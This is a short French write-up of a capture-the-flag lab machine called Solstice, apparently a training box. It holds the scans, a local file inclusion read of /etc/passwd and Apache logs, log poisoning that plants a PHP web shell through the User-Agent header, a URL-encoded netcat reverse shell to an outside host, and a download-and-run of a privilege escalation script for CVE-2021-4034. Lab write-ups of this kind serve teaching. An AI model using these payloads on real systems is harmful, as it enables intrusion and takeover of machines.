# Solstice

    sudo nmap -p -sV 192.168.204.72
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.204.72 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.204.72
    feroxbuster --silent -u http://192.168.204.72

Scans classiques. 

    21/tcp    open  ftp        pyftpdlib 1.5.6
    22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    25/tcp    open  smtp       Exim smtpd
    80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
    2121/tcp  open  ftp        pyftpdlib 1.5.6
    3128/tcp  open  http-proxy Squid http proxy 4.6
    8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
    54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
    62524/tcp open  tcpwrapped
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

J'ai essayé de me connecter en mode anonyme sur les deux ports FTP. Le premier a refusé, le deuxième a accepté mais ne contient rien.

    ftp anonymous@192.168.204.72 -P 2121
 
En revanche, il y a deux autres serveurs web sur les ports 8593 et 54787. Je commence par le 8593, l'énumération ne donne rien mais l'URL http://192.168.204.72:8593/index.php?book=list peut éventuellement amener des failles de type LFI.

Et en effet cela fonctionne avec un simple essai sur /etc/passwd :

    curl http://192.168.204.72:8593/index.php?book=../../../../../etc/passwd |  grep  -v nologin

J'ai trouvé l'utilisateur Miguel mais je n'arrive pas à récupérer de clé SSH, ou de fichier intéressant plus généralement. En revanche les logs sont bien là où elles devraient être : 

    curl http://192.168.204.72:8593/index.php?book=../../../../../var/log/apache2/access.log

Par élimination, il reste donc les failles de type Log Poisoning à essayer. La manière classique avec la modification du User-Agent semble passer et nous donne bien un reverse-shell :

    curl  -A  "BACKDOOR <?php system(\$_GET['cmd'])?>" http://192.168.204.72 
    curl http://192.168.204.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id
    curl http://192.168.204.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2F  
    f%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.231%209001%20%3E%2Ftmp%2Ff
    cat /var/www/local.txt


Élévation de privilèges toute simple avec un CVE : 

    wget http://192.168.45.231/linpeas.sh
    chmod u+x linpeas.sh
    ./linpeas.sh | tee res.txt
    ...
    wget http://192.168.45.231/CVE-2021-4034.sh
    ./CVE-2021-4034.sh
    ls /root
    cat /root/proof.txt

